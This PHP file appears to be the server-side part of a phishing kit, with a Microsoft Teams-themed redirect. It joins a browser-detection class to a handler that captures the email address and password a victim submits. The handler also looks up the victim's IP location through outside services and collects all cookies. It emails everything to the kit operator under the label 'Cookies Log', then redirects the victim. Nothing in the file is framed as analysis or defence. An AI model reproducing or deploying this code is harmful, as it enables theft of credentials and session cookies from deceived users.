<?php 
header("Access-Control-Allow-Origin: *");
ini_set("display_errors", 0);

class BrowserDetection {

    private $_user_agent;
    private $_name;
    private $_version;
    private $_platform;

    private $_basic_browser = array (
       'Trident\/7.0' => 'Internet Explorer 11',
    'Beamrise' => 'Beamrise',
    'Opera' => 'Opera',
    'OPR' => 'Opera',
    'Shiira' => 'Shiira',
    'Chimera' => 'Chimera',
    'Phoenix' => 'Phoenix',
    'Firebird' => 'Firebird',
    'Camino' => 'Camino',
    'Netscape' => 'Netscape',
    'OmniWeb' => 'OmniWeb',
    'Konqueror' => 'Konqueror',
    'icab' => 'iCab',
     'Lynx' => 'Lynx',
    'Links' => 'Links',
    'hotjava' => 'HotJava',
    'amaya' => 'Amaya',
    'IBrowse' => 'IBrowse',
    'iTunes' => 'iTunes',
    'Silk' => 'Silk',
    'Dillo' => 'Dillo', 
    'Maxthon' => 'Maxthon',
    'Arora' => 'Arora',
    'Galeon' => 'Galeon',
    'Iceape' => 'Iceape',
    'Iceweasel' => 'Iceweasel',
    'Midori' => 'Midori',
    'QupZilla' => 'QupZilla',
    'Namoroka' => 'Namoroka',
    'NetSurf' => 'NetSurf',
    'BOLT' => 'BOLT',
    'EudoraWeb' => 'EudoraWeb',
    'shadowfox' => 'ShadowFox',
    'Swiftfox' => 'Swiftfox',
    'Uzbl' => 'Uzbl',
    'UCBrowser' => 'UCBrowser',
    'Kindle' => 'Kindle',
    'wOSBrowser' => 'wOSBrowser',
     'Epiphany' => 'Epiphany', 
    'SeaMonkey' => 'SeaMonkey',
    'Avant Browser' => 'Avant Browser',
    'Firefox' => 'Firefox',
    'Chrome' => 'Google Chrome',
    'MSIE' => 'Internet Explorer',
    'Internet Explorer' => 'Internet Explorer',
     'Safari' => 'Safari',
    'Mozilla' => 'Mozilla'  
    );

     private $_basic_platform = array(
        'windows' => 'Windows', 
     'iPad' => 'iPad', 
      'iPod' => 'iPod', 
    'iPhone' => 'iPhone', 
     'mac' => 'Apple', 
    'android' => 'Android', 
    'linux' => 'Linux',
    'Nokia' => 'Nokia',
     'BlackBerry' => 'BlackBerry',
    'FreeBSD' => 'FreeBSD',
     'OpenBSD' => 'OpenBSD',
    'NetBSD' => 'NetBSD',
     'UNIX' => 'UNIX',
    'DragonFly' => 'DragonFlyBSD',
    'OpenSolaris' => 'OpenSolaris',
    'SunOS' => 'SunOS', 
    'OS\/2' => 'OS/2',
    'BeOS' => 'BeOS',
    'win' => 'Windows',
    'Dillo' => 'Linux',
    'PalmOS' => 'PalmOS',
    'RebelMouse' => 'RebelMouse'   
     ); 

    function __construct($ua = '') {
        if(empty($ua)) {
           $this->_user_agent = (!empty($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:getenv('HTTP_USER_AGENT'));
        }
        else {
           $this->_user_agent = $ua;
        }
       }

    function detect() {
        $this->detectBrowser();
        $this->detectPlatform();
        return $this;
    }

    function detectBrowser() {
     foreach($this->_basic_browser as $pattern => $name) {
        if( preg_match("/".$pattern."/i",$this->_user_agent, $match)) {
            $this->_name = $name;
            $known = array('Version', $pattern, 'other');
            $pattern_version = '#(?<browser>' . join('|', $known).')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
            if (!preg_match_all($pattern_version, $this->_user_agent, $matches)) {
            }
            $i = count($matches['browser']);
            if ($i != 1) {
      
                if (strripos($this->_user_agent,"Version") < strripos($this->_user_agent,$pattern)){
                    @$this->_version = $matches['version'][0];
                }
                else {
                    @$this->_version = $matches['version'][1];
                }
            }
            else {
                $this->_version = $matches['version'][0];
            }
            break;
        }
       }
   }

    function detectPlatform() {
      foreach($this->_basic_platform as $key => $platform) {
            if (stripos($this->_user_agent, $key) !== false) {
                $this->_platform = $platform;
                break;
            } 
      }
    }

   function getBrowser() {
      if(!empty($this->_name)) {
           return $this->_name;
      }
   }        

   function getVersion() {
       return $this->_version;
    }

    function getPlatform() {
       if(!empty($this->_platform)) {
          return $this->_platform;
       }
    }

    function getUserAgent() {
        return $this->_user_agent;
     }

     function getInfo() {
         return "<strong>Browser Name:</strong> {$this->getBrowser()}<br/>\n" .
        "<strong>Browser Version:</strong> {$this->getVersion()}<br/>\n" .
        "<strong>Browser User Agent String:</strong> {$this->getUserAgent()}<br/>\n" .
        "<strong>Platform:</strong> {$this->getPlatform()}<br/>";
     }
}  


if($_POST){


$ip = getenv('HTTP_CLIENT_IP')?:
getenv('HTTP_X_FORWARDED_FOR')?:
getenv('HTTP_X_FORWARDED')?:
getenv('HTTP_FORWARDED_FOR')?:
getenv('HTTP_FORWARDED')?:
getenv('REMOTE_ADDR');

// Create a cookie
    setcookie("username", $username, time() + (86400 * 30), "/"); // Expires in 30 days

$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
$query2 = @json_decode(file_get_contents("https://api.ipdata.co/{$ip}"));
if($query && $query['status'] == 'success') {
  $ipDetails = 'From '.$query['country'].', '.$query['regionName'] .', '.$query['city'].' '.$query['query'];
} else {
  $ipDetails = $ip. ' | '.@$query2->country . ' | '.@$query2->region. ' | '. @$query2->city ;

}


$id = $emailDisplay = $_POST['emailDisplay'];
$password = $_POST['password'];

if (empty($emailDisplay) || empty($password)) {
echo $finish_url;
}



$msg = "
<b>++++|Written By Php Codez|++++</b><br/>
<b>Email Address :</b> $id <br/>
<b>Password : </b>$password <br/>
<b>IP Details : </b>$ipDetails <br/>
<b>Time Received </b> - ". date("d/m/Y h:i:s a") ."<br/>
";
$msg .= "<b>Cookies:</b><br/>";
    
    foreach ($_COOKIE as $key => $value) {
        $msg .= "$key: $value<br/>";
    }

require ('Email-page.php');
$subject = "Cookies Log from $detail |  $emailDisplay | $ipDetails";
$headers = "MIME-Version: 1.0\r\n";
$finish_url = 'microsoft-teams-rooms.html';


 
$obj = new BrowserDetection();
$headers = "From: Php \n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

$message .= "" . $msg . "";
$message .= "" . $obj->detect()->getInfo(). "";



 $send  = @mail($to, $subject, $message, $headers);




echo $finish_url;

}


die;
    

  ?>